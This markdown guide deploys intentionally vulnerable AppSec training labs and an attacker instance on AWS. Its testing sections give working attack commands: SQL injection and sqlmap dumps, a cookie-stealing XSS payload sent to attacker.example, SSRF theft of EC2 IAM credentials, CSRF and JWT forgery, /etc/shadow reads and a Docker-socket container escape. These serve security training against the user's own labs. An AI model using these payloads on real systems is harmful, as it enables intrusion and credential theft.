# Deploying AppSec Labs to AWS

This guide covers two deployment approaches:
1. **EC2 with Docker** — Simplest, runs all 6 labs on one instance (~30 min setup)
2. **ECS Fargate** — Production-like, per-lab containers (optional, advanced)

For security testing, you'll also spin up a separate **attacker EC2 instance** to simulate real-world attack scenarios from an external perspective.

---

## Prerequisites

```bash
# Install AWS CLI
brew install awscli          # macOS
# or: pip install awscli

# Configure credentials
aws configure
# AWS Access Key ID: <your key>
# AWS Secret Access Key: <your secret>
# Default region: us-east-1
# Default output format: json

# Verify
aws sts get-caller-identity
```

---

## Architecture

```
┌─────────────────────────────────────────────────┐
│                   AWS VPC                        │
│                                                  │
│  ┌──────────────────┐    ┌──────────────────┐   │
│  │   Lab Server     │    │  Attacker Box    │   │
│  │   (EC2 t3.large) │    │  (EC2 t3.small)  │   │
│  │                  │    │                  │   │
│  │  Lab 01 :8080    │◄───│  curl / burp /   │   │
│  │  Lab 02 :5000    │    │  sqlmap / etc.   │   │
│  │  Lab 03 :3000    │    │                  │   │
│  │  Lab 04 :5001    │    └──────────────────┘   │
│  │  Lab 05 :3001    │                           │
│  │  Lab 06 :8081    │                           │
│  └──────────────────┘                           │
│                                                  │
│  Security Group: labs-sg                        │
│  (attacker box → lab server: all lab ports)     │
└─────────────────────────────────────────────────┘
```

---

## Part 1: Deploy Lab Server on EC2

### Step 1: Create Key Pair

```bash
aws ec2 create-key-pair \
  --key-name appsec-labs \
  --query 'KeyMaterial' \
  --output text > appsec-labs.pem

chmod 400 appsec-labs.pem
```

### Step 2: Create Security Groups

```bash
# Get your default VPC
VPC_ID=$(aws ec2 describe-vpcs \
  --filters "Name=isDefault,Values=true" \
  --query 'Vpcs[0].VpcId' --output text)

# Security group for the lab server (restricts access to attacker box only)
LAB_SG=$(aws ec2 create-security-group \
  --group-name appsec-lab-server \
  --description "AppSec Lab Server" \
  --vpc-id $VPC_ID \
  --query 'GroupId' --output text)

# Allow SSH from your IP only
MY_IP=$(curl -s https://checkip.amazonaws.com)/32
aws ec2 authorize-security-group-ingress \
  --group-id $LAB_SG \
  --protocol tcp --port 22 --cidr $MY_IP

echo "Lab Server SG: $LAB_SG"

# Security group for the attacker instance
ATTACKER_SG=$(aws ec2 create-security-group \
  --group-name appsec-attacker \
  --description "AppSec Attacker Box" \
  --vpc-id $VPC_ID \
  --query 'GroupId' --output text)

aws ec2 authorize-security-group-ingress \
  --group-id $ATTACKER_SG \
  --protocol tcp --port 22 --cidr $MY_IP

echo "Attacker SG: $ATTACKER_SG"

# Allow attacker box to reach all lab ports on lab server
# (we'll add the attacker's private IP after it's created)
for PORT in 8080 5000 3000 5001 3001 8081; do
  aws ec2 authorize-security-group-ingress \
    --group-id $LAB_SG \
    --protocol tcp --port $PORT \
    --source-group $ATTACKER_SG
done
```

### Step 3: Launch Lab Server

```bash
# Get latest Amazon Linux 2023 AMI
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters \
    "Name=name,Values=al2023-ami-2023*-x86_64" \
    "Name=state,Values=available" \
  --query 'sort_by(Images, &CreationDate)[-1].ImageId' \
  --output text)

# Launch t3.large (enough RAM for all 6 labs)
LAB_INSTANCE=$(aws ec2 run-instances \
  --image-id $AMI_ID \
  --instance-type t3.large \
  --key-name appsec-labs \
  --security-group-ids $LAB_SG \
  --block-device-mappings '[{"DeviceName":"/dev/xvda","Ebs":{"VolumeSize":30,"VolumeType":"gp3"}}]' \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=appsec-lab-server}]' \
  --user-data '#!/bin/bash
    dnf update -y
    dnf install -y docker git
    systemctl start docker
    systemctl enable docker
    usermod -aG docker ec2-user
    curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-linux-x86_64" \
      -o /usr/local/bin/docker-compose
    chmod +x /usr/local/bin/docker-compose
    echo "Setup complete" > /tmp/setup.done' \
  --query 'Instances[0].InstanceId' --output text)

echo "Lab Instance ID: $LAB_INSTANCE"

# Wait for it to be running
aws ec2 wait instance-running --instance-ids $LAB_INSTANCE

LAB_PUBLIC_IP=$(aws ec2 describe-instances \
  --instance-ids $LAB_INSTANCE \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

LAB_PRIVATE_IP=$(aws ec2 describe-instances \
  --instance-ids $LAB_INSTANCE \
  --query 'Reservations[0].Instances[0].PrivateIpAddress' \
  --output text)

echo "Lab Server Public IP:  $LAB_PUBLIC_IP"
echo "Lab Server Private IP: $LAB_PRIVATE_IP"
```

### Step 4: Deploy Labs

```bash
# Wait for user data to finish (~2 min), then SSH in
ssh -i appsec-labs.pem ec2-user@$LAB_PUBLIC_IP

# Once connected, clone and start all labs:
git clone https://github.com/your-org/appsec-labs.git ~/labs
cd ~/labs

# Start each lab (run in background, check logs if needed)
(cd lab-01-java-inventory    && docker compose up -d --build) &
(cd lab-02-python-ecommerce  && docker compose up -d --build) &
(cd lab-03-nodejs-gateway    && docker compose up -d --build) &
(cd lab-04-dotnet-banking    && docker compose up -d --build) &
(cd lab-05-microservices-platform && docker compose up -d --build) &
(cd lab-06-container-security     && docker compose up -d --build) &
wait

# Verify all are up
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

> **Note:** Lab 01 (Java/Maven build) takes ~5 min to compile. Lab 04 (.NET build) takes ~3 min. Others start in under 60 seconds.

---

## Part 2: Launch Attacker Instance

```bash
# Launch a smaller instance for the attacker role
ATTACKER_INSTANCE=$(aws ec2 run-instances \
  --image-id $AMI_ID \
  --instance-type t3.small \
  --key-name appsec-labs \
  --security-group-ids $ATTACKER_SG \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=appsec-attacker}]' \
  --user-data '#!/bin/bash
    dnf update -y
    dnf install -y python3-pip nmap curl git jq
    pip3 install sqlmap requests
    # Install Nuclei (fast vulnerability scanner)
    curl -L https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip \
      -o /tmp/nuclei.zip
    unzip /tmp/nuclei.zip -d /usr/local/bin/
    chmod +x /usr/local/bin/nuclei
    echo "Attacker setup complete" > /tmp/setup.done' \
  --query 'Instances[0].InstanceId' --output text)

aws ec2 wait instance-running --instance-ids $ATTACKER_INSTANCE

ATTACKER_PUBLIC_IP=$(aws ec2 describe-instances \
  --instance-ids $ATTACKER_INSTANCE \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

echo "Attacker Public IP: $ATTACKER_PUBLIC_IP"

# SSH to attacker box
ssh -i appsec-labs.pem ec2-user@$ATTACKER_PUBLIC_IP
```

---

## Part 3: Security Testing from the Attacker Box

SSH into the attacker instance, then set the lab server's **private IP** as the target:

```bash
LAB_IP="<LAB_PRIVATE_IP>"   # e.g. 10.0.1.42
```

### Lab 01 — SQL Injection Testing

```bash
# Verify reachability
curl -s http://$LAB_IP:8080/inventory/ | grep -o "<title>.*</title>"

# Manual error-based SQLi on login
curl -s -X POST http://$LAB_IP:8080/inventory/login \
  -d "username=admin'--&password=anything" | grep -i "error\|exception\|sql"

# UNION-based injection via product search
curl -s "http://$LAB_IP:8080/inventory/products/search?q=' UNION SELECT 1,2,3,4,username,password,7 FROM users--" \
  | grep -i "admin\|password"

# Automated SQLi scan with sqlmap
sqlmap -u "http://$LAB_IP:8080/inventory/products/search?q=test" \
  --level=3 --risk=2 --batch --dbs

# Dump users table
sqlmap -u "http://$LAB_IP:8080/inventory/products/search?q=test" \
  --batch -D inventory_db -T users --dump
```

### Lab 02 — XSS Testing

```bash
# Reflected XSS via search
curl -s "http://$LAB_IP:5000/search?q=<script>alert(1)</script>" \
  | grep -i "script"

# Stored XSS — submit a review with payload
curl -s -X POST http://$LAB_IP:5000/product/1/review \
  -d 'rating=5&comment=<script>fetch("http://attacker.example/steal?c="+document.cookie)</script>' \
  -c cookies.txt

# Verify stored payload is reflected on product page
curl -s http://$LAB_IP:5000/product/1 | grep -i "script"

# Nuclei XSS scan
nuclei -u http://$LAB_IP:5000 -t ~/nuclei-templates/dast/vulnerabilities/xss/
```

### Lab 03 — SSRF Testing

```bash
# Basic SSRF — fetch internal metadata service
curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}' | jq

# SSRF to steal IAM credentials (real EC2 instance has real creds!)
curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' | jq

# On the real lab server EC2, the above returns the actual IAM role name
# Then steal the credentials:
ROLE=$(curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  | jq -r '.body')

curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"}" | jq

# Internal port scan via SSRF
for port in 22 80 443 3306 5432 6379 8080; do
  result=$(curl -s -m 3 -X POST http://$LAB_IP:3000/api/fetch \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://127.0.0.1:$port\"}" | jq -r '.status // "timeout"')
  echo "Port $port: $result"
done
```

> **Real AWS Impact:** On the actual EC2 lab server, the Lab 03 SSRF can reach the **real AWS IMDS** at 169.254.169.254. If the EC2 instance has an IAM role attached, those real credentials will be returned. This makes Lab 03 the most impactful demo in an AWS deployment — assign a **read-only, scoped IAM role** to the lab server to limit blast radius.

### Lab 04 — CSRF Testing

```bash
# Step 1: Login as alice and capture session cookie
curl -s -c alice-cookies.txt -X POST http://$LAB_IP:5001/Account/Login \
  -d "Email=alice@securebank.com&Password=Alice123!&__RequestVerificationToken=" \
  -L | grep -i "welcome\|dashboard"

# Step 2: Confirm cookie captured
cat alice-cookies.txt

# Step 3: Trigger CSRF transfer WITHOUT including an anti-forgery token
# This simulates a victim visiting a malicious page that auto-submits a form
curl -s -b alice-cookies.txt -X POST http://$LAB_IP:5001/Transfer/Send \
  -d "FromAccountNumber=ALICE001&ToAccountNumber=BOB001&Amount=500&Description=CSRF-test" \
  | grep -i "success\|error"

# Step 4: Verify transfer happened (check balance)
curl -s -b alice-cookies.txt http://$LAB_IP:5001/Dashboard | grep -i "balance\|ALICE001"

# Host the CSRF PoC page on attacker box
python3 -c "
import http.server, socketserver
html = '''<html><body>
<form id=f action=\"http://$LAB_IP:5001/Transfer/Send\" method=POST>
<input name=FromAccountNumber value=ALICE001>
<input name=ToAccountNumber value=BOB001>
<input name=Amount value=1000>
<input name=Description value=csrf-attack>
</form>
<script>document.getElementById('f').submit()</script>
</body></html>'''
open('/tmp/csrf.html','w').write(html)
" && cd /tmp && python3 -m http.server 8888 &
echo "CSRF PoC at: http://$ATTACKER_PUBLIC_IP:8888/csrf.html"
```

### Lab 05 — IDOR / Authorization Testing

```bash
BASE="http://$LAB_IP:3001"

# Login as alice
TOKEN=$(curl -s -X POST $BASE/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@cloudcorp.com","password":"Alice123!"}' | jq -r .token)

echo "Alice token: ${TOKEN:0:50}..."

# IDOR-001: Access Bob's sensitive data as Alice
curl -s $BASE/api/users/2 \
  -H "Authorization: Bearer $TOKEN" | jq '{name,email,ssn,creditCard,apiKey,salary}'

# AUTHZ-002: Promote Alice to admin
curl -s -X PUT $BASE/api/users/1/role \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' | jq

# IDOR-003: Access admin's production file (AWS keys, DB passwords)
curl -s $BASE/api/files/3 \
  -H "Authorization: Bearer $TOKEN" | jq

# MSEC-002: JWT tampering — forge an admin token
FAKE_HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
FAKE_PAYLOAD=$(echo -n '{"userId":99,"email":"hacker@evil.com","role":"admin","exp":9999999999}' \
  | base64 | tr -d '=' | tr '+/' '-_')
FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}.fakesignature"

curl -s $BASE/api/admin/users \
  -H "Authorization: Bearer $FAKE_TOKEN" \
  -H "X-Admin-Key: admin-secret-key" | jq
```

### Lab 06 — Container Security Testing

```bash
# From attacker box: probe the web app
curl -s http://$LAB_IP:8081/debug | jq   # Extracts all hardcoded secrets
curl -s http://$LAB_IP:8081/env | jq     # Dumps all ENV vars including AWS creds
curl -s "http://$LAB_IP:8081/exec?cmd=id"                     # Verify running as root
curl -s "http://$LAB_IP:8081/exec?cmd=cat+/etc/shadow"        # Read /etc/shadow (root only)
curl -s "http://$LAB_IP:8081/exec?cmd=curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# From lab SERVER (SSH in): test container escape via Docker socket
ssh -i appsec-labs.pem ec2-user@$LAB_PUBLIC_IP

docker exec devsecure-web docker -H unix:///var/run/docker.sock ps
docker exec devsecure-web docker -H unix:///var/run/docker.sock \
  run --rm -v /:/host alpine cat /host/etc/shadow
```

---

## Part 4: AWS-Specific Attack Scenarios

These scenarios are unique to cloud deployments and demonstrate real-world cloud attack chains.

### Scenario A: SSRF → IMDS → IAM Credential Theft → AWS API Abuse

```bash
# 1. Use Lab 03 SSRF to steal real EC2 IAM role credentials
ROLE=$(curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  | jq -r '.body')

CREDS=$(curl -s -X POST http://$LAB_IP:3000/api/fetch \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"}" \
  | jq -r '.body' | jq)

# 2. Extract stolen credentials
ACCESS_KEY=$(echo $CREDS | jq -r '.AccessKeyId')
SECRET_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

# 3. Use stolen credentials on attacker box
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_SESSION_TOKEN=$SESSION_TOKEN

# 4. Enumerate what access we have
aws sts get-caller-identity
aws s3 ls                          # List accessible S3 buckets
aws ec2 describe-instances         # Enumerate EC2 instances
aws iam list-roles 2>/dev/null     # List IAM roles (if permitted)
```

### Scenario B: Container Escape → EC2 Host Access → IMDS

```bash
# Container escape via Docker socket → access host → steal real IMDS creds
docker exec devsecure-web docker -H unix:///var/run/docker.sock run \
  --rm -v /:/host alpine \
  wget -qO- http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Scenario C: Automated Recon with Nuclei

```bash
# Run Nuclei against all labs from attacker box
nuclei -l <(echo -e \
  "http://$LAB_IP:8080\nhttp://$LAB_IP:5000\nhttp://$LAB_IP:3000\nhttp://$LAB_IP:5001\nhttp://$LAB_IP:3001\nhttp://$LAB_IP:8081") \
  -t ~/nuclei-templates/ \
  -severity medium,high,critical \
  -o nuclei-findings.txt

cat nuclei-findings.txt
```

---

## IAM Role for Lab Server (Least Privilege)

Create a scoped IAM role so the SSRF credential theft demo works but limits blast radius:

```bash
# Create policy — read-only S3 and EC2 describe (for demo purposes)
aws iam create-policy \
  --policy-name appsec-lab-demo-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": ["s3:ListBuckets", "ec2:DescribeInstances", "sts:GetCallerIdentity"],
        "Resource": "*"
      }
    ]
  }'

# Create role with EC2 trust
aws iam create-role \
  --role-name appsec-lab-ec2-role \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]
  }'

# Attach policy to role
aws iam attach-role-policy \
  --role-name appsec-lab-ec2-role \
  --policy-arn $(aws iam list-policies --query 'Policies[?PolicyName==`appsec-lab-demo-policy`].Arn' --output text)

# Create instance profile and attach
aws iam create-instance-profile --instance-profile-name appsec-lab-profile
aws iam add-role-to-instance-profile \
  --instance-profile-name appsec-lab-profile \
  --role-name appsec-lab-ec2-role

# Attach to the lab server instance
aws ec2 associate-iam-instance-profile \
  --instance-id $LAB_INSTANCE \
  --iam-instance-profile Name=appsec-lab-profile
```

---

## Cost Estimate

| Resource | Type | Est. Monthly Cost |
|----------|------|------------------|
| Lab server | t3.large (2 vCPU, 8 GB) | ~$60/month |
| Attacker box | t3.small (2 vCPU, 2 GB) | ~$15/month |
| EBS storage (30 GB) | gp3 | ~$3/month |
| Data transfer | ~10 GB | ~$1/month |
| **Total** | | **~$79/month** |

**Tip:** Stop instances when not in use — you only pay for EBS storage (~$3/mo) when stopped.

```bash
# Stop both instances after lab sessions
aws ec2 stop-instances --instance-ids $LAB_INSTANCE $ATTACKER_INSTANCE

# Restart for next session
aws ec2 start-instances --instance-ids $LAB_INSTANCE $ATTACKER_INSTANCE

# Get the new public IPs (they change on restart unless you use Elastic IPs)
aws ec2 describe-instances --instance-ids $LAB_INSTANCE \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text
```

---

## Cleanup (Tear Down Everything)

```bash
# Terminate instances
aws ec2 terminate-instances --instance-ids $LAB_INSTANCE $ATTACKER_INSTANCE

# Wait for termination
aws ec2 wait instance-terminated --instance-ids $LAB_INSTANCE $ATTACKER_INSTANCE

# Delete security groups
aws ec2 delete-security-group --group-id $LAB_SG
aws ec2 delete-security-group --group-id $ATTACKER_SG

# Delete key pair (and local .pem file)
aws ec2 delete-key-pair --key-name appsec-labs
rm -f appsec-labs.pem

# Delete IAM resources
aws iam remove-role-from-instance-profile \
  --instance-profile-name appsec-lab-profile --role-name appsec-lab-ec2-role
aws iam delete-instance-profile --instance-profile-name appsec-lab-profile
aws iam detach-role-policy \
  --role-name appsec-lab-ec2-role \
  --policy-arn $(aws iam list-policies --query 'Policies[?PolicyName==`appsec-lab-demo-policy`].Arn' --output text)
aws iam delete-role --role-name appsec-lab-ec2-role
aws iam delete-policy \
  --policy-arn $(aws iam list-policies --query 'Policies[?PolicyName==`appsec-lab-demo-policy`].Arn' --output text)

echo "All AWS resources cleaned up."
```

---

## Security Notice

These lab instances are intentionally vulnerable. To limit exposure:

- Security groups restrict lab ports to the attacker instance's SG only — not the open internet
- SSH access is limited to your IP only (`$MY_IP`)
- Assign a least-privilege IAM role (not a power-user role) to the lab server
- Stop instances when not actively using them
- Never run these in a production AWS account — use a dedicated training account
